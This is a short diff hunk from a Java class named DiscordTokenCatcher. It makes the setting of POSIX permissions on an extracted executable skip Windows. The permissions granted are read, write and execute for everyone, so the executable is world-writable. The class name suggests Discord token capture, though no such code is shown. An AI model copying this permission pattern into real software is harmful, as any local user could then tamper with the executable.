@@ -124,12 +124,14 @@ public class DiscordTokenCatcher {
 					executableFile = dest;
 				}
 
-				Files.setPosixFilePermissions(dest.toPath(),
-						EnumSet.of(PosixFilePermission.OWNER_READ, PosixFilePermission.OWNER_WRITE,
-								PosixFilePermission.OWNER_EXECUTE, PosixFilePermission.GROUP_READ,
-								PosixFilePermission.GROUP_WRITE, PosixFilePermission.GROUP_EXECUTE,
-								PosixFilePermission.OTHERS_READ, PosixFilePermission.OTHERS_WRITE,
-								PosixFilePermission.OTHERS_EXECUTE));
+				if (!arch.equals("win32")) {
+					Files.setPosixFilePermissions(dest.toPath(),
+							EnumSet.of(PosixFilePermission.OWNER_READ, PosixFilePermission.OWNER_WRITE,
+									PosixFilePermission.OWNER_EXECUTE, PosixFilePermission.GROUP_READ,
+									PosixFilePermission.GROUP_WRITE, PosixFilePermission.GROUP_EXECUTE,
+									PosixFilePermission.OTHERS_READ, PosixFilePermission.OTHERS_WRITE,
+									PosixFilePermission.OTHERS_EXECUTE));
+				}
 			}
 		}
 
